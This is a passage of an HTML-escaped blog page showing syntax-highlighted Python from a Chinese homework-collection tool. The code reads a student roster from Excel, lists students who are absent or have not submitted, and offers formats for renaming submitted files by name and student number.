class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cell_value&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				data_fullname&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cell_value&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				data_total &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;zip&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data_stunum&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#合并字典，检查名单&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token comment&#34;&gt;#pprint(data_total)  #check&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;缺勤/未上交名单：&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; os&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;listdir&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			temp_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data_name&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			temp_stunum &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data_stunum&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			temp_fullname &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data_fullname&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				temp_excel1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; temp_name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				temp_excel2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; temp_stunum&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				temp_excel3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; temp_fullname&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; temp_file &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; temp_excel2 &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; temp_excel3 &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; temp_excel1 &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; temp_file &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#check name or stunum&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						flag &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; flag &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-interpolation&#34;&gt;&lt;span class=&#34;token string&#34;&gt;f&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel3&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt; &lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					stuid&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;temp_excel2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					stuname&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;temp_excel1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					stufullname&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;temp_excel3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;			&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; n &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;无 缺勤/未上交 者&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				messagebox&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;showinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;完成！&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;无 缺勤/未上交 者！&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;改名功能（主要算法）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wb &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; xlrd&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;open_workbook&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				ws &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; wb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sheet_by_name&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Sheet1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				data_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#名字简写&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				data_stunum &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#学号&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				data_fullname &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#全名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				data_total &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#check list&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				form &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;e2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				selfdef &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;e3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;nrows&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#excel 第一列放姓名，第二列放学号&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					data_name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cell_value&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					data_stunum&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cell_value&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					data_fullname&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cell_value&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;					data_total &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;zip&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data_stunum&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#合并字典，检查名单&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token comment&#34;&gt;#pprint(data_total)  #check&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				temp_name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data_name&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				temp_stunum &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data_stunum&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				temp_fullname &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; data_fullname&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;如果需要文件重命名，请选择命名格式：\n班级可自行输入:\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;				switch &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;姓名学号：张三20201305999&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;姓名+学号：张三+20201305999&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;3&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;姓名-学号：张三-20201305999&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token string&#34;&gt;&#39;4&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;班级姓名：信安20-3张三&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;5&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;姓名学号：张三20201305999（名字简写）&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;						&lt;span class=&#34;token string&#34;&gt;&#39;6&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;姓名+学号：张三+20201305999（名字简写）&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;7&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;姓名-学号：张三-20201305999（名字简写）&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td 